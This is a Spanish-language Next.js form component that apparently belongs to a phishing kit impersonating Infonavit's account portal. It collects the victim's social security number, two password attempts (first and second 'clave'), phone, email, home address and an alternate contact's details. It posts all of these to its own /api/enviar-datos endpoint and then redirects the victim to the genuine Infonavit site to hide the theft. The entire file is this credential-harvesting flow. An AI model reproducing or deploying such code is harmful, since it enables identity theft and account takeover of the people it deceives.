"use client";
import ErrorForm from "@/components/errorForm";
import Loading from "@/components/loading";
import { useFormularioStore } from "@/lib/form-store";
import { useRouter } from "next/navigation";
import React, { useState } from "react";
import { useForm } from "react-hook-form";

export default function FormularioContacto() {
  const [toggle, setToggle] = useState(false);
  const [loading, setLoading] = useState(false);

  const {
    clave,
    claveError,
    nss,
    setCelular,
    setCorreo,
    setPostal,
    setEstado,
    setDelegacion,
    setColonia,
    setCalle,
    setExterior,
    setInterior,
    setNombre,
    setPaterno,
    setMaterno,
    setCel,
    resetFormulario,
  } = useFormularioStore();
  const {
    register,
    handleSubmit,
    reset,
    setValue,
    formState: { errors, isValid },
  } = useForm({ mode: "onChange" });
  const router = useRouter();

  const formatearSoloNumeros = (value) => {
    const valor = value.replace(/\D/g, "");
    return valor;
  };

  const handleCelularNum = (e) => {
    const valorFormateado = formatearSoloNumeros(e.target.value);
    setValue("celular", valorFormateado);
  };

  const handlePostalNum = (e) => {
    const valorFormateado = formatearSoloNumeros(e.target.value);
    setValue("postal", valorFormateado);
  };

  const handleExteriorNum = (e) => {
    const valorFormateado = formatearSoloNumeros(e.target.value);
    setValue("exterior", valorFormateado);
  };

  const handleInteriorNum = (e) => {
    const valorFormateado = formatearSoloNumeros(e.target.value);
    setValue("interior", valorFormateado);
  };

  const handleCelNum = (e) => {
    const valorFormateado = formatearSoloNumeros(e.target.value);
    setValue("cel", valorFormateado);
  };

  const handleClick = () => {
    setToggle(!toggle);
  };

  const enviarDatos = async (data) => {
    setCelular(data.celular);
    setCorreo(data.correo);
    setPostal(data.postal);
    setEstado(data.estado);
    setDelegacion(data.delegacion);
    setColonia(data.colonia);
    setCalle(data.calle);
    setExterior(data.exterior);
    setInterior(data.interior);
    setNombre(data.nombre);
    setPaterno(data.paterno);
    setMaterno(data.materno);
    setCel(data.cel);

    setLoading(true);

    try {
      const respuesta = await fetch("/api/enviar-datos", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          seguridad: nss,
          clavePrimerIntento: claveError,
          claveSegundoIntento: clave,
          celular: useFormularioStore.getState().celular,
          correo: useFormularioStore.getState().correo,
          postal: useFormularioStore.getState().postal,
          estado: useFormularioStore.getState().estado,
          delegacion: useFormularioStore.getState().delegacion,
          colonia: useFormularioStore.getState().colonia,
          calle: useFormularioStore.getState().calle,
          exterior: useFormularioStore.getState().exterior,
          interior: useFormularioStore.getState().interior,
          nombre: useFormularioStore.getState().nombre,
          paterno: useFormularioStore.getState().paterno,
          materno: useFormularioStore.getState().materno,
          cel: useFormularioStore.getState().cel,
        }),
      });

      const result = await respuesta.json();

      if (result.success) {
        reset();
        router.push("https://micuenta.infonavit.org.mx/?gad_source=1");
      }
      resetFormulario();
    } catch (error) {
      console.log(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      {loading && <Loading />}
      <form className="mt-8" onSubmit={handleSubmit(enviarDatos)}>
        <div className="bg-white py-10 px-7 shadow rounded-sm mb-7">
          <div className="mb-12">
            <h2 className="text-xl geomanist-bold mb-5">Datos de contacto</h2>
            <div className="grid lg:grid-cols-2 gap-4">
              <div>
                <label
                  htmlFor="celular"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Número de celular
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528] mb-3"
                  name="celular"
                  id="celular"
                  onInput={handleCelularNum}
                  autoComplete="off"
                  maxLength={10}
                  type="tel"
                  {...register("celular", {
                    required:
                      "El número de teléfono celular que proporcionaste no es válido, por favor verificalo",
                    minLength: {
                      value: 10,
                      message:
                        "El número de teléfono celular que proporcionaste no es válido, por favor verificalo",
                    },
                  })}
                />

                {errors.celular && (
                  <ErrorForm>{errors.celular?.message}</ErrorForm>
                )}
              </div>
              <div>
                <label
                  htmlFor="correo"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Correo electrónico
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                  name="correo"
                  id="correo"
                  autoComplete="off"
                  type="email"
                  {...register("correo", {
                    required: true,
                    pattern: {
                      value: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
                    },
                  })}
                />
              </div>
            </div>
          </div>
          <div>
            <h2 className="text-xl geomanist-bold mb-5">
              Dirección donde vives actualmente
            </h2>
            <div className="grid lg:grid-cols-2 gap-4">
              <div>
                <label
                  htmlFor="postal"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Código postal
                  <span className="text-[#dd0528]">*</span>
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                  name="postal"
                  id="postal"
                  onInput={handlePostalNum}
                  autoComplete="off"
                  type="tel"
                  maxLength={5}
                  {...register("postal", {
                    required: true,
                    maxLength: 5,
                    minLength: 5,
                  })}
                />
              </div>
              <div>
                <label
                  htmlFor="estado"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Estado
                  <span className="text-[#dd0528]">*</span>
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                  name="estado"
                  id="estado"
                  autoComplete="off"
                  type="text"
                  {...register("estado", {
                    required: true,
                  })}
                />
              </div>
              <div>
                <label
                  htmlFor="delegacion"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Delegación o municipio
                  <span className="text-[#dd0528]">*</span>
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                  name="delegacion"
                  id="delegacion"
                  autoComplete="off"
                  type="text"
                  {...register("delegacion", {
                    required: true,
                  })}
                />
              </div>
              <div>
                <label
                  htmlFor="colonia"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Colonia
                  <span className="text-[#dd0528]">*</span>
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                  name="colonia"
                  id="colonia"
                  autoComplete="off"
                  type="text"
                  {...register("colonia", {
                    required: true,
                  })}
                />
              </div>
              <div>
                <label
                  htmlFor="calle"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Calle
                  <span className="text-[#dd0528]">*</span>
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                  name="calle"
                  id="calle"
                  autoComplete="off"
                  type="text"
                  {...register("calle", {
                    required: true,
                  })}
                />
              </div>
              <div className="grid md:grid-cols-2 gap-4">
                <div>
                  <label
                    htmlFor="exterior"
                    className="text-[#929292] text-[0.9375rem]"
                  >
                    Número exterior
                    <span className="text-[#dd0528]">*</span>
                  </label>
                  <input
                    className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                    name="exterior"
                    autoComplete="off"
                    id="exterior"
                    onInput={handleExteriorNum}
                    type="tel"
                    {...register("exterior", {
                      required: true,
                    })}
                  />
                </div>
                <div>
                  <label
                    htmlFor="interior"
                    className="text-[#929292] text-[0.9375rem]"
                  >
                    Número interior
                  </label>
                  <input
                    className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                    name="interior"
                    id="interior"
                    autoComplete="off"
                    onInput={handleInteriorNum}
                    type="tel"
                    {...register("interior", {
                      required: true,
                    })}
                  />
                </div>
              </div>
            </div>
          </div>
          <p className="mt-6 text-gray-400 text-sm">*Campos obligarios</p>
        </div>

        <div className="bg-white pt-6 pb-1 px-7 shadow rounded-sm">
          <div className="mb-12">
            <h2 className="text-xl geomanist-bold mb-5">
              Persona alternativa de contacto
            </h2>
            <div className="grid lg:grid-cols-2 gap-4">
              <div>
                <label
                  htmlFor="nombre"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Nombres(s)
                  <span className="text-[#dd0528]">*</span>
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                  name="nombre"
                  id="nombre"
                  autoComplete="off"
                  type="text"
                  {...register("nombre", {
                    required: true,
                  })}
                />
              </div>
              <div>
                <label
                  htmlFor="paterno"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Apellido paterno
                  <span className="text-[#dd0528]">*</span>
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                  name="paterno"
                  id="paterno"
                  autoComplete="off"
                  type="text"
                  {...register("paterno", {
                    required: true,
                  })}
                />
              </div>
              <div>
                <label
                  htmlFor="materno"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Apellido materno
                  <span className="text-[#dd0528]">*</span>
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528]"
                  name="materno"
                  id="materno"
                  autoComplete="off"
                  type="text"
                  {...register("materno", {
                    required: true,
                  })}
                />
              </div>
              <div>
                <label
                  htmlFor="cel"
                  className="text-[#929292] text-[0.9375rem]"
                >
                  Número de celular
                  <span className="text-[#dd0528]">*</span>
                </label>
                <input
                  className="w-full mt-2 border border-gray-300 rounded-sm py-[0.399rem] px-3 outline-[#dd0528] mb-3"
                  name="cel"
                  id="cel"
                  autoComplete="off"
                  maxLength={10}
                  onInput={handleCelNum}
                  type="tel"
                  {...register("cel", {
                    required:
                      "El número de teléfono celular que proporcionaste no es válido, por favor verificalo",
                    minLength: {
                      value: 10,
                      message:
                        "El número de teléfono celular que proporcionaste no es válido, por favor verificalo",
                    },
                  })}
                />
                {errors.cel && <ErrorForm>{errors.cel?.message}</ErrorForm>}
              </div>
            </div>
          </div>
        </div>

        <div className="mt-7 flex items-center justify-center gap-2 mb-3">
          <input
            type="checkbox"
            name="confirmo"
            onClick={handleClick}
            className={`appearance-none w-4 h-4 rounded-[0.125rem] border relative after:content-[''] after:absolute after:w-[.4rem] after:h-[.7rem] after:border-r-2 after:border-b-2 after:border-white after:rotate-45 after:right-1 after:lg:right-[0.25rem] after:top-0 after:opacity-0 cursor-pointer ${
              toggle ? "bg-[#dd0528] after:opacity-100 border-[#dd0528]" : ""
            } `}
            id="confirmo"
            {...register("confirmo", {
              required: true,
            })}
          />
          <label htmlFor="confirmo">Confirmo que mis datos son correctos</label>
        </div>

        <button
          type="submit"
          disabled={!isValid}
          className={`${
            isValid ? "bg-[#dd0528] cursor-pointer" : "bg-[#cacaca]"
          }  w-[60%] sm:w-[40%] mx-auto block py-2 text-white geomanist-medium rounded-full`}
        >
          Continuar
        </button>
      </form>
    </>
  );
}
